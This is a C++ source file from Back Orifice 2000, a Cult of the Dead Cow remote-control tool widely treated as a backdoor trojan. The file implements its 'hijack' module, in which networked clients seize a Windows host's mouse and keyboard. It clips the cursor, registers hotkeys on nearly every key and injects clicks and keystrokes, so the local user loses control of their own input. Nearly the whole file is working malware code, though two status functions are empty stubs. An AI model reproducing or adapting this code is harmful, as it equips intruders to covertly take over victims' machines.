/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<plugins.h>
#include<auth.h>
#include<bocomreg.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include<strhandle.h>
#include"bo_peep.h"
#include"hijack.h"
#include"hiclient.h"
#include"resource.h"

#define MAX_STREAMS 16

typedef struct {
	CAuthSocket *pSock;
} HIJACK_ARGS;


// -------------------- Global Variables ------------------------

// Hijack control
static HANDLE g_hHThread=NULL;
static BOOL g_bHijActive=FALSE;

// Screen size
static DWORD g_xdim,g_ydim;

// Primary cursor
static WORD g_wCurFlags;

#define CF_LBUTTON 1
#define CF_MBUTTON 2
#define CF_RBUTTON 4

// Keyboard
static WORD g_wKeyFlags;

#define KF_LSHIFT 1
#define KF_RSHIFT 2
#define KF_SHIFT  3
#define KF_LCTRL  4
#define KF_RCTRL  8
#define KF_CTRL   12
#define KF_LALT   16
#define KF_RALT   32
#define KF_ALT	  48
#define KF_WIN    64


// Ownership
static CAuthSocket *g_pMouseOwner=NULL,*g_pKeybdOwner=NULL;
static BOOL g_bMouseShow=TRUE;

// SendClientMessage: Issues a message to the child socket for display

int SendClientMessage(CAuthSocket *pChild, const char *svMessage)
{
	int nDataLen=sizeof(HIJACK_HEADER)+lstrlen(svMessage)+1;
	HIJACK_HEADER *phh=(HIJACK_HEADER *)malloc(nDataLen);
	phh->bAction=HA_MESSAGE;
	phh->message.dwDataLen=lstrlen(svMessage)+1;
	lstrcpy((LPTSTR)(phh+1),svMessage);

	int nRet=pChild->Send((BYTE *)phh,nDataLen);
	free(phh);

	return nRet;
}

// SendClientSuccess: Issues a success flag to the socket

int SendClientSuccess(CAuthSocket *pChild)
{
	HIJACK_HEADER hh;
	hh.bAction=HA_SUCCESS;	
	return pChild->Send((BYTE *)&hh,sizeof(HIJACK_HEADER));
}

// SendClientFailure: Issues a failure flag to the socket

int SendClientFailure(CAuthSocket *pChild)
{
	HIJACK_HEADER hh;
	hh.bAction=HA_FAILURE;	
	return pChild->Send((BYTE *)&hh,sizeof(HIJACK_HEADER));
}



// GetStatus: Gets status report information to give to child sockets

HIJACK_HEADER *GetStatus(int *pnStatLen)
{
	HIJACK_HEADER *phh=(HIJACK_HEADER *)malloc(sizeof(HIJACK_HEADER));
	if(phh==NULL) return NULL;

	// Foo Bar

	return phh;
}

// FreeStatus: Cleans up after GetStatus()

void FreeStatus(CAuthSocket *pChild, HIJACK_HEADER *pStatus)
{
	free(pStatus);
}

// SendStatus: Sends a status report to a child socket

int SendStatus(CAuthSocket *pChild, HIJACK_HEADER *pStatus, int nStatLen)
{
	// Fnord
	
	return 1;
}

// OwnMouse: Causes a child socket to own the mouse cursor
void OwnMouse(CAuthSocket *pChild)
{
	if(pChild==NULL) {
		ClipCursor(NULL);
		if(g_pMouseOwner!=NULL) SendClientSuccess(g_pMouseOwner);
		g_pMouseOwner=NULL;
		g_wCurFlags=0;
	} else {
		POINT pt;
		RECT r;

		GetCursorPos(&pt);
		r.left=pt.x;
		r.right=pt.x;
		r.top=pt.y;
		r.bottom=pt.y;
		ClipCursor(&r);
		
		g_wCurFlags=0;
		g_pMouseOwner=pChild;
		SendClientSuccess(g_pMouseOwner);	
	}
}


// OwnKeybd: Causes a child socket to own the keyboard
void OwnKeybd(CAuthSocket *pChild)
{
	int alt,vk;
	if(pChild==NULL) {
		// Unregister nasty keycaptures
		for(alt=0;alt<16;alt++) {
			for(vk=0x5;vk<=0x5D;vk++) {
				UnregisterHotKey(NULL,1000+(alt*0x100)+vk);
			}
		}

		// Report to client
		if(g_pKeybdOwner!=NULL) SendClientSuccess(g_pKeybdOwner);
		g_pKeybdOwner=NULL;
	} else {
		// Do nasty keycaptures
		for(alt=0;alt<16;alt++) {
			for(vk=0x5;vk<=0x5D;vk++) {
				RegisterHotKey(NULL,1000+(alt*0x100)+vk,alt,vk);
			}
		}
	
		g_pKeybdOwner=pChild;
		SendClientSuccess(g_pKeybdOwner);
	}
}

// MoveMouse: Moves the mouse cursor

void MoveMouse(HIJACK_HEADER *pStatus, int nStatLen)
{
	// ----- Get mouse position -----
	POINT pt;
	pt.x=(pStatus->mouse.wPosX*g_xdim)>>16;
	pt.y=(pStatus->mouse.wPosY*g_ydim)>>16;

	// ---- Check to see if we're moving or hitting a button ----
	if(pStatus->bAction==HA_MOVE) {
		RECT r;
		r.left=pt.x;
		r.right=pt.x;
		r.top=pt.y;
		r.bottom=pt.y;
		ClipCursor(NULL);
		SetCursorPos(r.left,r.top);
		ClipCursor(&r);
		return;
	}
	
	// ------ Proceed to hit button ------

	// Get target window
	BOOL bCapture;
	HWND hTarget;
	if(GetCapture()!=NULL) {
		hTarget=GetCapture();
		bCapture=TRUE;
	} else {
		hTarget=WindowFromPoint(pt);
		AttachThreadInput(GetCurrentThreadId(),GetWindowThreadProcessId(hTarget,NULL),TRUE);
		bCapture=FALSE;
	}

	if(hTarget!=NULL) {	
		UINT uMsg;
		BOOL bPost=TRUE;
		int nHit;
		// Check For Client Area or Non-Client Area
		
		if(!bCapture)
			nHit=SendMessage(hTarget,WM_NCHITTEST,0,MAKELONG(pt.x,pt.y));
		
		if(nHit==HTCLIENT || bCapture) {
			// -------------- CLIENT AREA ------------
					
			// Simulate button messages
			switch(pStatus->bAction) {
			case HA_LBUTTONDOWN:
				g_wCurFlags |= CF_LBUTTON;
				uMsg=WM_LBUTTONDOWN;
				break;
			case HA_MBUTTONDOWN:
				g_wCurFlags |= CF_MBUTTON;
				uMsg=WM_MBUTTONDOWN;
				break;
			case HA_RBUTTONDOWN:
				g_wCurFlags |= CF_RBUTTON;
				uMsg=WM_RBUTTONDOWN;			
				break;
			case HA_LBUTTONUP:
				g_wCurFlags &= ~CF_LBUTTON;
				uMsg=WM_LBUTTONUP;
				break;
			case HA_MBUTTONUP:
				g_wCurFlags &= ~CF_MBUTTON;
				uMsg=WM_MBUTTONUP;
				break;
			case HA_RBUTTONUP:
				g_wCurFlags &= ~CF_RBUTTON;
				uMsg=WM_RBUTTONUP;
				break;
			case HA_LBUTTONDBL:
				g_wCurFlags |= CF_LBUTTON;
				uMsg=WM_LBUTTONDBLCLK;
				break;
			case HA_MBUTTONDBL:
				g_wCurFlags |= CF_MBUTTON;
				uMsg=WM_MBUTTONDBLCLK;
				break;
			case HA_RBUTTONDBL:
				g_wCurFlags |= CF_RBUTTON;
				uMsg=WM_RBUTTONDBLCLK;
				break;
			}
				
		} else {

            // ----------- NON CLIENT AREA ------------
			
			// Simulate button messages
			switch(pStatus->bAction) {
			case HA_LBUTTONDOWN:
				g_wCurFlags |= CF_LBUTTON;
				uMsg=WM_NCLBUTTONDOWN;
				break;
			case HA_MBUTTONDOWN:
				g_wCurFlags |= CF_MBUTTON;
				uMsg=WM_NCMBUTTONDOWN;
				break;
			case HA_RBUTTONDOWN:
				g_wCurFlags |= CF_RBUTTON;
				uMsg=WM_NCRBUTTONDOWN;			
				break;
			case HA_LBUTTONUP:
				g_wCurFlags &= ~CF_LBUTTON;
				uMsg=WM_NCLBUTTONUP;
				break;
			case HA_MBUTTONUP:
				g_wCurFlags &= ~CF_MBUTTON;
				uMsg=WM_NCMBUTTONUP;
				break;
			case HA_RBUTTONUP:
				g_wCurFlags &= ~CF_RBUTTON;
				uMsg=WM_NCRBUTTONUP;
				break;
			case HA_LBUTTONDBL:
				g_wCurFlags |= CF_LBUTTON;
				uMsg=WM_NCLBUTTONDBLCLK;
				break;
			case HA_MBUTTONDBL:
				g_wCurFlags |= CF_MBUTTON;
				uMsg=WM_NCMBUTTONDBLCLK;
				break;
			case HA_RBUTTONDBL:
				g_wCurFlags |= CF_RBUTTON;
				uMsg=WM_NCRBUTTONDBLCLK;
				break;
			}
		}

		if(!bCapture) {
			// Determine if the mouse should activate this window
			if(hTarget!=GetForegroundWindow()) {
				// Get top level parent
				HWND hTopParent=hTarget;
				while(GetParent(hTopParent)!=GetDesktopWindow() && hTopParent!=NULL)
					hTopParent=GetParent(hTopParent);
				if(hTopParent==NULL) hTopParent=hTarget;
				
				// Send WM_MOUSEACTIVATE message
				LRESULT lRes;
				lRes=SendMessage(hTarget,WM_MOUSEACTIVATE,(WPARAM)hTopParent,MAKELONG(nHit,uMsg));
				if(lRes==MA_ACTIVATE || lRes==MA_ACTIVATEANDEAT) {
					// Activate window
					SetForegroundWindow(hTarget);
					
				}
				if(lRes==MA_ACTIVATEANDEAT || lRes==MA_NOACTIVATEANDEAT) 
					bPost=FALSE;
			}
		}
		
		// Send message to window unless explicitly told to eat the message
		if(bPost) {
			if(nHit==HTCLIENT || bCapture) {
				// Send message to window unless explicitly told to eat the message
				ScreenToClient(hTarget,&pt);
				// Calculate fwKeys
				WORD fwKeys=0;
				fwKeys |= (g_wCurFlags & CF_LBUTTON)?MK_LBUTTON:0;
				fwKeys |= (g_wCurFlags & CF_MBUTTON)?MK_MBUTTON:0;
				fwKeys |= (g_wCurFlags & CF_RBUTTON)?MK_RBUTTON:0;
				fwKeys |= (g_wKeyFlags & KF_CTRL)?MK_CONTROL:0;
				fwKeys |= (g_wKeyFlags & KF_SHIFT)?MK_SHIFT:0;
				
				PostMessage(hTarget, uMsg, fwKeys, MAKELONG(pt.x,pt.y));
			} else {
				POINTS ncpt;
				ncpt.x=(SHORT)pt.x;
				ncpt.y=(SHORT)pt.y;

				PostMessage(hTarget, uMsg, (WPARAM)nHit, *(LPARAM *)&ncpt);
			}
		}	
	}	
}

// DoKeypress: Simulates a keypress

void DoKeypress(HIJACK_HEADER *pStatus, int nStatLen)
{
	// Temporarily unregister key
	int alt;
	for(alt=0;alt<16;alt++) {
		UnregisterHotKey(NULL,1000+(alt*0x100)+pStatus->keybd.bVirtKey);
	}

	// Simulate keypress
	keybd_event(pStatus->keybd.bVirtKey,pStatus->keybd.bScanCode,pStatus->keybd.dwKeyFlags,0);
	
	// Adjust keyflags
	if(pStatus->keybd.dwKeyFlags & KEYEVENTF_KEYUP) {
		if(pStatus->keybd.bVirtKey==VK_SHIFT) g_wKeyFlags &= ~KF_SHIFT;
		if(pStatus->keybd.bVirtKey==VK_CONTROL) g_wKeyFlags &= ~KF_CTRL;
		if(pStatus->keybd.bVirtKey==VK_MENU) g_wKeyFlags &= ~KF_ALT;
		if(pStatus->keybd.bVirtKey==VK_RWIN || pStatus->keybd.bVirtKey==VK_LWIN) g_wKeyFlags &= ~KF_WIN;
	} else {
		if(pStatus->keybd.bVirtKey==VK_SHIFT) g_wKeyFlags |= KF_SHIFT;
		if(pStatus->keybd.bVirtKey==VK_CONTROL) g_wKeyFlags |= KF_CTRL;
		if(pStatus->keybd.bVirtKey==VK_MENU) g_wKeyFlags |= KF_ALT;
		if(pStatus->keybd.bVirtKey==VK_RWIN || pStatus->keybd.bVirtKey==VK_LWIN) g_wKeyFlags |= KF_WIN;
	}

	// Re-register hotkey
	for(alt=0;alt<16;alt++) {
		RegisterHotKey(NULL,1000+(alt*0x100)+pStatus->keybd.bVirtKey,alt,pStatus->keybd.bVirtKey);
	}
}


DWORD WINAPI HijackThread(HIJACK_ARGS *pArgs)
{
	CAuthSocket *pSock,*pChild;
	CAuthSocket *pChildren[MAX_STREAMS];
	int nChildren,i,j,nRet;
	
	// ---------- Get parameters --------------------
	
	pSock=pArgs->pSock;
	free(pArgs);

	g_nNumThreads=1;

	// --------- Initialize hijack ----------

	g_xdim=GetSystemMetrics(SM_CXSCREEN);
	g_ydim=GetSystemMetrics(SM_CYSCREEN);
	POINT pt;
	GetCursorPos(&pt);
	g_pMouseOwner=NULL;
	g_pKeybdOwner=NULL;
	
	// --------------- Data socket loop ----------------------
	nChildren=0;
	g_bHijActive=TRUE;
	while(g_bHijActive) {
		Sleep(5);
		// ------ Process Window Messages -------
		MSG msg;
		if(PeekMessage(&msg,NULL,0,0,PM_REMOVE)) {
			TranslateMessage(&msg);		
			DispatchMessage(&msg);
		}
		
		// ------ Check for accepts --------
		if(nChildren<MAX_STREAMS) {
			pChild=pSock->Accept();
			if(pChild!=NULL) {
				pChildren[nChildren]=pChild;
				nChildren++;
			}
		}
		if(nChildren>0) {
			int nStatLen;
			HIJACK_HEADER *pStatus;

			// ------ Receive commands  ---------
			for(i=(nChildren-1);i>=0;i--) {
				pChild=pChildren[i];
				nRet=pChild->Recv((BYTE **)&pStatus,&nStatLen);
				if(nRet<0) {
					// -- bad socket --
					pChild->Close();
					if(g_pMouseOwner==pChild) {
						g_pMouseOwner=NULL;
						OwnMouse(NULL);
					}
					if(g_pKeybdOwner==pChild) {
						g_pKeybdOwner=NULL;
						OwnKeybd(NULL);
					}

					delete pChild;
					for(j=i+1;j<nChildren;j++) {
						pChildren[j-1]=pChildren[j];
					}	
					pChildren[j-1]=NULL;
					nChildren--;
				} else if(nRet>0) {
					// ----- Process commands ------
					
					switch(pStatus->bAction) {
					case HA_OWNDEVICE:
						if(pStatus->bDevice==HD_MOUSE && g_pMouseOwner==NULL) OwnMouse(pChild);
						else if(pStatus->bDevice==HD_KEYBD && g_pKeybdOwner==NULL) OwnKeybd(pChild);
						else SendClientFailure(pChild);
						break;
					case HA_FREEDEVICE:
						if(pStatus->bDevice==HD_MOUSE && g_pMouseOwner==pChild) OwnMouse(NULL);
						else if(pStatus->bDevice==HD_KEYBD && g_pKeybdOwner==pChild) OwnKeybd(NULL);
						else SendClientFailure(pChild);
						break;
					case HA_MOVE:
					case HA_LBUTTONDOWN:
					case HA_LBUTTONUP:
					case HA_MBUTTONDOWN:
					case HA_MBUTTONUP:
					case HA_RBUTTONDOWN:
					case HA_RBUTTONUP:
					case HA_LBUTTONDBL:
					case HA_MBUTTONDBL:
					case HA_RBUTTONDBL:
						if(pStatus->bDevice==HD_MOUSE && g_pMouseOwner==pChild) MoveMouse(pStatus,nStatLen);
						break;
					case HA_KEYUP:
					case HA_KEYDOWN:
						if(pStatus->bDevice==HD_KEYBD && g_pKeybdOwner==pChild) DoKeypress(pStatus,nStatLen);
						break;
					}
						
					// --- Clean up ---
					pChild->Free((BYTE *)pStatus);
				}
			}	
		}
	}

	OwnMouse(NULL);
	OwnKeybd(NULL);

	// Close all connections
	for(i=(nChildren-1);i>=0;i--) {
		pChildren[i]->Close();
		delete pChildren[i];
		pChildren[i]=NULL;
	}
	nChildren=0;
	pSock->Close();
	delete pSock;
	
	g_nNumThreads=0;
	return 0;
}

int CmdProc_StartHijack(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char *svEnc=NULL,*svAuth=NULL,*svNetMod=NULL,*svParam=NULL;
	
	// Check if already started
	if(g_hHThread!=NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Hijack socket already created.\n");
		return -1;
	}

	// Get parameters

	svNetMod=GetCfgStr(g_szAdvancedOptions,"Hijack Net Module");
	svEnc=GetCfgStr(g_szAdvancedOptions,"Hijack Encryption");
	svAuth=GetCfgStr(g_szAdvancedOptions,"Hijack Auth");
	
	if((svParam=svArg2)!=NULL) {
		if(svParam[0]!='\0') svNetMod=svParam;	
		if((svParam=BreakString(svNetMod,","))!=NULL) {
			if(svParam[0]!='\0') svEnc=svParam;
			if((svParam=BreakString(svEnc,","))!=NULL) {
				if(svParam[0]!='\0') svAuth=svParam;
			}
		} 
	}
	
	// Create listener socket
	svParam=GetCfgStr(g_szAdvancedOptions,"Hijack Bind Str");
	if(svArg3!=NULL) {
		if(svArg3[0]!='\0') svParam=svArg3;
	}
	CAuthSocket *pSock=ListenAuthSocket(InteractiveListen,cas_from->GetUserID(),NULL,svParam,svNetMod,svEnc,svAuth);
	if(pSock==NULL || pSock==(CAuthSocket *)0xFFFFFFFF) {
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't start listening socket.\n");	
		return -1;
	}

	// Spawn listener thread
	HIJACK_ARGS *pArgs=(HIJACK_ARGS *)malloc(sizeof(HIJACK_ARGS));
	if(pArgs==NULL) {
		pSock->Close();
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return -1;
	}
	pArgs->pSock=pSock;
	
	DWORD dwTid;
	g_hHThread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)HijackThread,pArgs,0,&dwTid);
	if(g_hHThread==NULL) {
		free(pArgs);
		pSock->Close();
		IssueAuthCommandReply(cas_from,comid,0,"Could create thread.\n");
	}
	
	char svResponse[512],svConAddr[256];
	pSock->GetConnectAddr(svConAddr,256);
	wsprintf(svResponse, "Hijack started on %.256s\n",svConAddr);
	IssueAuthCommandReply(cas_from, comid, 0, svResponse);
	return 0;
}

int CmdProc_StopHijack(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	g_bHijActive=FALSE;
	if(WaitForSingleObject(g_hHThread,5000)!=WAIT_OBJECT_0) {
		IssueAuthCommandReply(cas_from, comid, 0, "Couldn't stop hijack in 5 sec. Aborting thread.\n");
		TerminateThread(g_hHThread,0);
	}
	CloseHandle(g_hHThread);
	g_hHThread=NULL;
	
	IssueAuthCommandReply(cas_from, comid, 0, "Hijack stopped.\n");
	return 0;
}

